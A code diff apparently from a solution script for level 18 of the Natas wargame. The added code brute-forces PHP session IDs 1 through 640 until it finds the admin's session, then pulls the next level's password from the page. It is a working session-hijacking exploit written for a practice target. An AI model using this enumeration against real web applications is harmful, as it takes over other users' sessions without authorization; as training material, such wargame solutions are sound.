@@ -1,6 +1,8 @@
 """
+Find the right session without un-setting admin!
 """
 
+from bs4 import BeautifulSoup
 import requests
 from typing import Optional
 
@@ -9,22 +11,18 @@ from natas_utils import *
 LEVEL = 18
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
-    # IDs are numbers in [1, 640]
-    max_id = 640
+    for i in range(1, 641):
+        with requests.session() as session:
+            session.auth = login
+            session.cookies.set("PHPSESSID", str(i))
+            response = session.post(f"{url}/index.php?debug=1", data={"username": "admin", "password": "admin"})
+            response.raise_for_status()
 
-    pw_list = []
-    with requests.Session() as session:
-        form_data = {
-            "debug": "1",
-            "username": "admin",
-            "password": "null",
-        }
-        session.cookies.set(name="PHPSESSID", value="0.1")
-        response = session.get(url, auth=login, params=form_data)
-        print(response.text)
-
-    pw_list = extract_candidate_passwords(response.text)
-    return try_level_login(LEVEL + 1, pw_list)
+            if "You are an admin" in response.text:
+                candidates = extract_candidate_passwords(response.text)
+                if len(candidates) == 1:
+                    return candidates[0]
+    return None
 
 if __name__ == "__main__":
     url, login = load_level(LEVEL)
